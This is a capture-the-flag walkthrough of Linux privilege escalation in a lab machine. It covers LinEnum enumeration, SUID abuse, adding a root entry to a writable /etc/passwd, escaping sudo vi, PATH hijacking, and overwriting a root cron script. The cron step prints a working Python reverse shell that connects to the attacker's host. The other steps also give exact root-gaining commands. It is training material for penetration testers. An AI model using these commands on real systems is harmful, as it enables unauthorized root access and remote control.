# Common Linux Privilege Escalation

## Understanding Privesc

### What does “privilege escalation” mean?

At its core, Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it’s the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

### Why is it important?

Rarely, when doing a CTF or real-world penetration test, will you be able to gain a foothold (initial access) that affords you administrator access. Privilege escalation is crucial because it lets you gain system administrator levels of access. This allows you to do many things, including:

- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later
- Change privilege of users
- Get that cheeky root flag ;)

As well as any other administrator or superuser commands that you desire.

## Direction of Privilege Escalation

Privilege Tree:

```
       +-------------------+
       |    Administrator  |
       +-------------------+
                 ^
                 | Vertical Privesc
                 |
    +------------|------------+
    |            |            |
    |            |            |
 +----------+ +----------+ +----------+
 | Normal   | |  Normal  | |  Normal  |
 |  User 1  | |  User 2  | |  User 3  |
 +----------+ +----------+ +----------+
    |            |            |
    +------------>------------+
         Horizontal Privesc
```

There are two main privilege escalation variants:

- **Horizontal privilege escalation:** This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get superuser access. [Travel sideways on the tree]

- **Vertical privilege escalation (privilege elevation):** This is where you attempt to gain higher privileges or access with an existing account that you have already compromised. For local privilege escalation attacks, this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]

## Enumeration

### What is LinEnum?

LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. It is important to understand what commands LinEnum executes so that you are able to manually enumerate privesc vulnerabilities in a situation where you’re unable to use LinEnum or other similar scripts. In this room, we will explain what LinEnum is showing and what commands can be used to replicate it.

### Where to get LinEnum

You can download a local copy of LinEnum from:

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

It’s worth keeping this somewhere you’ll remember because LinEnum is an invaluable tool.

### How do I get LinEnum on the target machine?

There are two ways to get LinEnum on the target machine. The first way is to go to the directory that you have your local copy of LinEnum stored in and start a Python web server using:

```bash
python -m SimpleHTTPServer 8000
```

Then, using `wget` on the target machine, and your local IP, you can grab the file from your local machine:

```bash
wget 10.8.6.72:8000/LinEnum.sh
```

**Sample Output:**

```
--2020-03-05 05:43:45--  http://10.8.6.72:8000/LinEnum.sh
Connecting to 10.8.6.72:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh            100%[=====================>]  45.54K  273KB/s   in 0.2s    
```

Once downloaded, make the file executable using the command:

```bash
chmod +x LinEnum.sh
```

### Other Methods

If you’re unable to transport the file, you can also, if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using `vi` or `nano`. Once you’ve done this, save the file with the `.sh` extension. Then make the file executable using:

```bash
chmod +x LinEnum.sh
```

### Running LinEnum

LinEnum can be run the same way you run any bash script. Go to the directory where LinEnum is and run the command:

```bash
./LinEnum.sh
```

### Understanding LinEnum Output

The LinEnum output is broken down into different sections. These are the main sections that we will focus on:

- **Kernel:** Kernel information is shown here. There is most likely a kernel exploit available for this machine.
- **Can we read/write sensitive files:** The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn’t usually be able to write to sensitive files.
- **SUID Files:** The output for SUID files is

 shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with the permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges.
- **Crontab Contents:** The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit cron jobs here.

### Q1. First, let's SSH into the target machine using the credentials `user3:password`. This simulates getting a foothold on the system as a normal privileged user.

#### Action

To connect, use the following SSH command:

```bash
ssh user3@10.10.156.3
```

**Explanation:**  
SSH (Secure Shell) allows us to securely connect to the target machine, providing us with command-line access to begin our enumeration and privilege escalation efforts.

### Q2. What is the target’s hostname?

#### Action

Once connected, determine the hostname of the machine by running:

```bash
hostname
```

**Sample Output:**

```
polobox
```

**Ans:** polobox

**Explanation:**  
The `hostname` command reveals the name of the machine, which can be useful in understanding the environment and context of the target.

### Q3. Look at the output of `/etc/passwd` – how many "user[x]" accounts are there on the system?

#### Action

List the users on the system by running:

```bash
ls /home
```

Then, count the number of user accounts by running:

```bash
grep "^user" /etc/passwd | wc -l
```

**Sample Output:**

```
user1  user2  user3  user4  user5  user6  user7  user8
```

**Ans:** 8

**Explanation:**  
By examining the `/etc/passwd` file, we can identify the number of user accounts on the system, which is critical for understanding the environment and potential attack vectors.

### Q4. How many available shells are there on the system?

#### Action

List the available shells by running:

```bash
cut -d ":" -f7 /etc/passwd | sort -u
```

**Sample Output:**

```
/bin/bash
/bin/false
/bin/sync
/usr/sbin/nologin
```

**Ans:** 4

**Explanation:**  
This command helps us identify the different shells available on the system, which might provide insights into user behavior and system configuration.

### Q5. What is the name of the bash script that is set to run every 5 minutes by cron?

**Hint:** It’s on `user4`’s desktop.

The `/etc/crontab` file reveals that a script is scheduled to run every 5 minutes from `user4`’s Desktop.

#### Action

Check the cron jobs and identify the script by running:

```bash
cat /etc/crontab
```

**Sample Output:**

```
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
```

**Ans:** autoscript.sh

**Explanation:**  
Understanding cron jobs is essential, as they can often be exploited for privilege escalation if misconfigured.

### Q6. What critical file has had its permissions changed to allow some users to write to it?

**Hint:** Think about where passwords are stored on Linux.

#### Action

Check the permissions of the critical file by running:

```bash
ls -l /etc/passwd
```

**Sample Output:**

```
-rw-rw-r-- 1 root root 2694 Mar  6 07:08 /etc/passwd
```

**Ans:** /etc/passwd

**Explanation:**  
The `/etc/passwd` file stores user account information. If its permissions are misconfigured, it can be exploited to escalate privileges, for instance by adding a new root user.

### Q7. Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!

**No answer needed.**

## Abusing SUID/GUID Files

### Finding and Exploiting SUID Files

The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file's owner/group—in this case, as the superuser. We can leverage this to get a shell with these privileges!

### What is an SUID Binary?

In Linux, everything is a file, including directories and devices, which have permissions to allow or restrict three operations: read, write, and execute. When setting permissions for any file, it's important to consider which Linux users should be allowed or restricted from these operations.

Take a look at how maximum privileges (rwx-rwx-rwx) are represented:

- `r` = read
- `w` = write
- `x` = execute

| user | group | others |
|------|-------|--------|
| rwx  | rwx   | rwx    |

The maximum number of bits that can be used to set permission for each user is 7, which is a combination of read (4), write (2), and execute (1) operations. For example, if you set permissions using `chmod` as 755, then it will be: rwxr-xr-x.

When special permission is given to each user, it becomes SUID or SGID. When the extra bit 4 is set to the user (Owner), it becomes SUID (Set User ID), and when bit 2 is set to the group, it becomes SGID (Set Group ID).

Therefore, the permissions to look for when identifying SUID are:

- **SUID:** rws-rwx-rwx
- **GUID:** rwx-rws-rwx

### Finding SUID Binaries

We already know that there are SUID-capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually, we can use the following command to search the file system for SUID/GUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Let’s break down this command:

- `find`: Initiates the "find" command.
- `/`: Searches the whole file system.
- `-perm`: Searches for files with specific permissions.
- `-u=s`: Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form.
- `-type f`: Only searches for files.
- `2>/dev/null`: Suppresses errors.

### Q1. What is the path of the file in user3’s directory that stands out to you?

#### Action

Let’s search for files with the SUID bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Sample Output:**

```
/sbin/mount.nfs
/sbin/mount.ecryptfs_private
/sbin/mount.cifs
/usr/sbin/pppd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/umount
/bin/fusermount
/home/user5/script
/home/user3/shell
```

There is an interesting file (`shell`) in our home directory.

**Ans:** /home/user3/shell

### Q2. We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Let’s run it! We can do this by running: `./shell`

The file `/home/user3/shell` is owned by root and has the SUID bit set. Running the program will execute it as root:

#### Action

Run the SUID file with:

```bash
./shell
```

**Sample Output:**

```
You Can't Find Me
Welcome to Linux Lite 4.4 user3

Thursday 14 May 2020, 16:30:21
Memory Usage: 329/983MB (33.47%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
```

### Q3. Congratulations! You should now have a shell as root user, well done!

#### Action

Verify the root shell with:

```bash
whoami
```

**Sample Output:**

```
root
```

**Ans:** root

## Exploiting Writable /etc/passwd

### Exploiting a Writable /etc/passwd

Continuing with the enumeration of users, we found that user7 is a member of the root group with GID 0. From the LinEnum scan, we already know that the `/etc/passwd` file is writable by this user. This means user7 can edit the `/etc/passwd` file, allowing us to create a new root user.

### Understanding /etc/passwd

The `/etc/passwd` file stores essential information required during login, such as user account information. It contains a list of system accounts, each with details like user ID, group ID, home directory, shell, and more.

The `/etc/passwd` file should generally have read permission for all users, as many command utilities use it to map user IDs to usernames. However, write access should be limited to the superuser/root account. If write access is mistakenly granted, a user could exploit this to create a root user account.

### Understanding /etc/passwd Format

The `/etc/passwd` file contains one entry per line for each user. Each field is separated by a colon (`:`) symbol, with a total of seven fields as follows:

```plaintext
test:x:0:0:root:/root:/bin/bash
```

- **Username:** Used when the user logs in. It should be between 1 and 32 characters in length.
- **Password:** An `x` character indicates that the encrypted password is stored in `/etc/shadow`.
- **User ID (UID):** Each user must be assigned a UID. UID 0 is reserved for root, UIDs 1-99 for predefined accounts, and UIDs 100-999 for system accounts/groups.
- **Group ID (GID):** The primary group ID, stored in `/etc/group`.
- **User ID Info:** This is the comment field, used to add extra information about the user.
- **Home Directory:** The absolute path to the user's home directory.
- **Command/Shell:** The absolute path of the user's shell (e.g., `/bin/bash`).

### How to Exploit a Writable /etc/passwd

If we have a writable `/etc/passwd` file, we can add a new entry to create a new user with root privileges by following the above format, setting the UID, GID, and shell to root.

### Q1. First, let’s exit out of root from our previous task by typing `exit`. Then use `su` to swap to user7 with the password `password`.

#### Action

Switch to user7 with:

```bash
su - user7
```

**Sample Output:**

```
Welcome to Linux Lite 4.4 user7

Thursday 14 May 2020, 16:48:36
Memory Usage: 317/983MB (32.25%)
Disk Usage: 6/217GB (3%)
```

### Q2. Having read the information above, what direction of privilege escalation is this attack?

**Ans:** Vertical

**Explanation:**  
This is vertical privilege escalation because we are attempting to gain higher privileges (root) with an existing account (user7).

### Q3. Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: `openssl passwd -1 -salt [salt] [password]`. What is the hash created by using this command with the salt, "new" and the password "123"?

#### Action

Generate the hash with:

```bash
openssl passwd -1 -salt "new" "123"
```

**Sample Output:**

```
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

### Q4. Great! Now we need to take this value and create a new root user account. What would the `/etc/passwd` entry look like for a root user with the username "new" and the password hash we created before?

**Hint:** `username:passwordhash:0:0:root:/root:/bin/bash`

**Ans:** new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

### Q5. Great! Now you’ve got everything you need. Just add that entry to the end of the `/etc/passwd` file!

#### Action

Add the entry with:

```bash
printf 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\n' >> /etc/passwd
```

### Q6. Now, use `su` to login as the "new"

 account, and then enter the password. If you’ve done everything correctly, you should be greeted by a root prompt! Congratulations!

**Hint:** If you’re having problems authenticating, check that you’re escaping the `$`.

#### Action

Switch to the new user with:

```bash
su - new
```

**Sample Output:**

```
Welcome to Linux Lite 4.4

You are running in superuser mode, be very careful.
```

**Final Output:**

```bash
root@polobox:~# whoami
root
```

**Ans:** root

## Escaping Vi Editor

**Sudo -l**

This exploit leverages effective user account enumeration. Every time you have access to an account during a CTF scenario, you should use `sudo -l` to list what commands you’re able to use as a superuser on that account. Sometimes, you’ll find that you’re able to run certain commands as a root user without the root password, enabling you to escalate privileges.

### Escaping Vi

Running this command on the "user8" account shows us that this user can run `vi` with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!

### Misconfigured Binaries and GTFOBins

If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can execute, a good resource is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

[GTFOBins website](https://gtfobins.github.io/)

### Q1. First, let’s exit out of root from our previous task by typing `exit`. Then use `su` to swap to user8, with the password `password`.

#### Action

Exit the root shell and switch to user8:

```bash
su - user8
```

**Sample Output:**

```
Welcome to Linux Lite 4.4 user8
Thursday 14 May 2020, 17:00:17
Memory Usage: 321/983MB (32.66%)
Disk Usage: 6/217GB (3%)
```

### Q2. Let’s use the `sudo -l` command. What does this user require (or not require) to run vi as root?

**Hint:** No password!

#### Action

List the sudo privileges:

```bash
sudo -l
```

**Sample Output:**

```
User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
```

We can run `vi` with sudo without a password.

**Ans:** NOPASSWD

### Q3. So, all we need to do is open `vi` as root by typing `sudo vi` into the terminal.

#### Action

Open `vi` with sudo:

```bash
sudo vi
```

### Q4. Now, type `:!sh` to open a shell!

#### Action

Inside `vi`, type the following command to escape to a shell:

```
:!sh
```

**Sample Output:**

```
# whoami
root
```

You should now have a root shell.

## Exploiting Crontab

### Instructions

### What is Cron?

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

### How to View What Cron Jobs are Active

You can use the command `cat /etc/crontab` to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn’t find anything.

### Format of a Cron Job

Cron jobs exist in a certain format, and being able to read that format is important if you want to exploit a cron job.

| Symbol | Meaning           |
|--------|-------------------|
| #      | ID                |
| m      | Minute            |
| h      | Hour              |
| dom    | Day of the month  |
| mon    | Month             |
| dow    | Day of the week   |
| user   | What user the command will run as |
| command| What command should be run |

**Example:**

```plaintext
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

### How Can We Exploit This?

We know from our LinEnum scan that the file `autoscript.sh` on user4’s Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task is to create a command that will return a shell and paste it into this file. When the file runs again in five minutes, the shell will be running as root.

Let’s do it!

### Q1. First, let’s exit out of root from our previous task by typing `exit`. Then use `su` to swap to user4, with the password `password`.

#### Action

Switch to user4:

```bash
su - user4
```

**Sample Output:**

```
Welcome to Linux Lite 4.4 user4
Thursday 14 May 2020, 17:09:48
Memory Usage: 324/983MB (32.96%)
Disk Usage: 6/217GB (3%)
```

### Q2. Now, on our host machine, let’s create a payload for our cron exploit using `msfvenom`.

**Note:** Instead of using `msfvenom`, we’ll craft a Python reverse shell.

#### Action

Check if Python is installed on the target machine:

```bash
which python
```

**Sample Output:**

```
/usr/bin/python
```

Perfect! Now, let’s write a reverse Python shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Q3. What is the flag to specify a payload in `msfvenom`?

**Ans:** `-p`

**Explanation:**  
In `msfvenom`, the `-p` parameter is used to specify the payload.

### Q4. Create a payload using `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`

Instead of using `msfvenom`, use the Python reverse shell payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.**.**",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Q5. What directory is the `autoscript.sh` under?

**Ans:** `/home/user4/Desktop`

**Explanation:**  
We already found this location during our previous enumeration.

### Q6. Let’s replace the contents of the file with our payload using:

```bash
echo [MSFVENOM OUTPUT] > autoscript.sh
```

Replace the initial script with our Python payload:

```bash
printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.9.**.**\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" > /home/user4/Desktop/autoscript.sh 
```

### Q7. After copying the code into `autoscript.sh`, wait for cron to execute the file, and start your netcat listener using:

```bash
nc -lvp 8888
```

Start the listener on your machine:

```bash
nc -nlvp 1234
```

### Q8. After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!

**Final Output:**

```bash
nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.9.117.
Ncat: Connection from 10.10.9.117:51804.
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

## Exploiting PATH Variable

### What is PATH?

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

You can view the PATH of the relevant user with the command:

```bash
echo $PATH
```

### How Does This Let Us Escalate Privileges?

Let’s say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like listing processes with `ps`. Unlike in our previous SUID example, in this situation, we can’t exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we’ve written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method, we can run whatever commands we like as root!

Let’s do it!

### Q1. Going back to our local SSH session, not the netcat root session (you can close that now), let’s exit out of root from our previous task by typing `exit`. Then use `su` to swap to user5, with the password `password`.

#### Action

Switch to user5:

```bash
su - user5
```

**Sample Output:**

```
Welcome to Linux Lite 4.4 user5
Friday 15 May 2020, 02:18:49
Memory Usage: 332/983MB (33.77%)
Disk Usage: 6/217GB (3%)
```

### Q2. Let’s go to user5’s home directory, and run the file `script`. What command do we think it’s executing?

Notice that the script file is owned by root and has the SUID bit set, meaning it can run with root privileges:

```bash
ls -l /home/user5/script
```

**Sample Output:**

```
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user5/script
```

When we run the program `./script`, it seems to execute the `ls` command:

```bash
./script 
```

**Sample Output:**

```
Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
```

**Ans:** `ls`

### Q3. Now we know what command to imitate, let’s change directory to `tmp`.

#### Action

Change directory:

```bash
cd /tmp/
```

### Q4. Now, we’re inside `/tmp`, let’s create an imitation executable. The format is:

```bash
echo "[command]" > [name of the executable we're imitating]
```

**Hint:** The command is actually just the path to the bash executable `/bin/bash`.

**Ans:** `echo "/bin/bash" > ls`

### Q5. Great! Now we’ve made our imitation, we need to make it an executable. What command do we execute to do this?

**Hint:** `x` for e`x`ecutable.

**Ans:** `chmod +x ls`

### Q6. Now, we need to change the PATH variable so that it points to the directory where we have our imitation `ls` stored! We do this using:

```bash
export PATH=/tmp:$PATH
```

**Explanation:**  
This will cause the system to use our `ls` command whenever `ls` is called.

### Q7. Now, change directory back to user5’s home directory.

#### Action

Go back to the home directory:

```bash
cd
```

### Q8. Now, run the `script` file again. You should be sent into a root bash prompt! Congratulations!

#### Action

Run the script:

```bash
./script 
```

**Sample Output:**

```
Welcome to Linux Lite 4.4 user5
root@polobox:~# whoami
root
```

You should now have a root shell.
